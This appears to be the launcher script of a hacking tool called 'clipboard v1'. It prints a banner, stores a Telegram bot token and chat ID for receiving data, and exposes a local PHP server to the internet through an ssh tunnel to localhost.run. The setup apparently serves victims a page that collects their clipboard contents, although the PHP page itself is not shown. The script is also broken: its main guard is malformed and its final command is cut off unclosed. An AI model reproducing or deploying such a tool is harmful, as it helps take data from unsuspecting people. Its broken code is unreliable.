# clipboard v1
# Code By senator majazi
import os

banner = '''\033[35m
                       @@@@@@@@@@@@@@@@@@@@@
                    @@@@@@@@@         @@@@@@@@@
                 @@@@@@@@@@&           @@@@@@@@@@@
              @@@@@@@@@@@@@#    @@@    &@@@@@@@@@@@@@
           @@@@@@@@@@                         @@@@@@@@@@
         @@@@                                         @@@@
        @@@                                             @@@
        @@@                                             @@@
        @@@     @@@@@   \033[31m  clipboard v1   \033[35m  @@@@@     @@@
        @@@     @@@@@                         @@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     @@@
        @@@                                             @@@
        @@@    \033[33m Code By Senatormajazi       \033[35m                @@@
        @@@@%  \033[33m              \033[35m              %@@@@
          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
'''

def save_data(chat_id, token):
    data = '{"chat_id": "'+chat_id+'", "token": "'+token+'"}'
    f = open("data.json", "w")
    f.write(data)
    f.close()

if name == 'main':
    os.system("clear")
    print(banner)
    token = input("\033[34m [\033[33m$\033[34m] \033[32mEnter The Telegram Bot Token: ")
    chat_id = input("\033[34m [\033[33m$\033[34m] \033[32mEnter The Your Telegram Chat Id: ")
    save_data(chat_id, token)
    os.system("php -S localhost:3000 | ssh -R 80:127.0.0.1:3000 nokey@localhost.run